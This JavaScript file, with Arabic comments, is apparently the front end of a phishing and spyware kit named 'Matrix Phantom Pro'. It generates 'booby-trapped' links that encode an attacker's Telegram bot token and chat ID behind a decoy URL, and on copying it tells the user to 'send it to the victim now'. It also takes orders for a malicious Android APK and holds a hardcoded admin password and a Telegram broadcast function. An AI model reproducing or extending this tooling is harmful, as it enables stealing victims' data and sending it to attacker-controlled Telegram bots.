// --- MATRIX PHANTOM PRO LOGIC ---

// 1. نظام الدخول السري (3 ضغطات)
let adminClicks = 0;
let lastClickTime = 0;

function adminTrigger() {
    const currentTime = new Date().getTime();
    if (currentTime - lastClickTime > 1000) adminClicks = 0;
    
    adminClicks++;
    lastClickTime = currentTime;

    if (adminClicks === 3) {
        Swal.fire({
            title: 'Matrix System Access',
            html: '<input type="password" id="admin-pass" class="swal2-input" placeholder="Password">',
            showCancelButton: true,
            confirmButtonText: 'Enter',
            background: '#000',
            color: '#00ff00',
            preConfirm: () => {
                const pass = document.getElementById('admin-pass').value;
                return pass === "01224815487" ? true : Swal.showValidationMessage('كلمة المرور غلط!');
            }
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('master-panel').style.display = 'block';
                loadAdminStats();
                adminClicks = 0;
            }
        });
    }
}

// 2. توليد اللينك الملغم (مجاني)
function generatePhantomLink() {
    const decoy = document.getElementById('decoy-url').value || "https://youtube.com";
    const botToken = document.getElementById('target-token').value.trim();
    const chatId = document.getElementById('target-chatid').value.trim();
    const payloadType = document.getElementById('payload-type').value;

    if (!botToken || !chatId) return Swal.fire('بيانات ناقصة', 'دخل التوكن والـ ID', 'error');

    const payload = btoa(JSON.stringify({ t: botToken, i: chatId, u: decoy, type: payloadType }));
    const finalLink = `${window.location.origin}/r.html?p=${payload}`;

    Swal.fire({
        title: 'تم توليد الرابط! 🔥',
        html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#111; color:#00ff00; border:1px solid #00ff00; text-align:center;">`,
        confirmButtonText: 'نسخ'
    }).then(() => {
        document.getElementById('gen-url').select();
        document.execCommand('copy');
        Swal.fire('تم النسخ', 'أرسله للضحية الآن', 'success');
    });
}

// 3. طلب بناء تطبيق ملغم (APK Request)
function requestAPK() {
    const token = document.getElementById('apk-token').value.trim();
    const cid = document.getElementById('apk-chatid').value.trim();
    const myID = localStorage.getItem('m_id_user') || 'User-' + Math.floor(Math.random() * 1000);

    if (!token || !cid) return Swal.fire('خطأ', 'أدخل بيانات البوت كاملة', 'error');

    db.ref('apk_requests').push({
        userId: myID,
        botToken: token,
        chatId: cid,
        time: new Date().toLocaleString(),
        status: 'Pending'
    }).then(() => {
        Swal.fire('تم إرسال الطلب 🏗️', 'سيقوم الأدمن ببناء تطبيقك والتواصل معك عبر الواتساب.', 'success');
    });
}

// 4. إرسال اقتراح
function submitSuggestion() {
    const text = document.getElementById('suggestion-text').value;
    if (!text) return;
    db.ref('suggestions').push({ text: text, time: new Date().toLocaleString() })
    .then(() => {
        document.getElementById('suggestion-text').value = '';
        Swal.fire('تم ✅', 'شكراً لاقتراحك', 'success');
    });
}

// 5. نظام الإرسال الجماعي (Smart Broadcast)
async function startBroadcasting() {
    const adminToken = document.getElementById('broadcast-token').value.trim();
    const message = document.getElementById('broadcast-message').value;
    if (!adminToken || !message) return;

    const snap = await db.ref('users').once('value');
    const users = snap.val();
    if (!users) return;

    Swal.fire('جاري الإرسال...', 'لا تغلق الصفحة', 'info');
    let count = 0;
    for (let id in users) {
        await new Promise(res => setTimeout(res, 100)); // تأخير بسيط للأمان
        fetch(`https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`);
        count++;
    }
    Swal.fire('تم 🎉', `تم الإرسال لـ ${count} مستخدم`, 'success');
}

// 6. جلب بيانات لوحة الأدمن
function loadAdminStats() {
    // جلب الاقتراحات
    db.ref('suggestions').on('value', snap => {
        const list = document.getElementById('suggestions-list');
        list.innerHTML = '';
        snap.forEach(child => {
            list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;"><small>${child.val().time}</small><br>${child.val().text}</div>`;
        });
    });

    // جلب طلبات الـ APK
    db.ref('apk_requests').on('value', snap => {
        const list = document.getElementById('apk-requests-list');
        list.innerHTML = '';
        snap.forEach(child => {
            const data = child.val();
            list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;"><small>${data.time}</small><br>User: ${data.userId}<br>Token: ${data.botToken}</div>`;
        });
    });
}
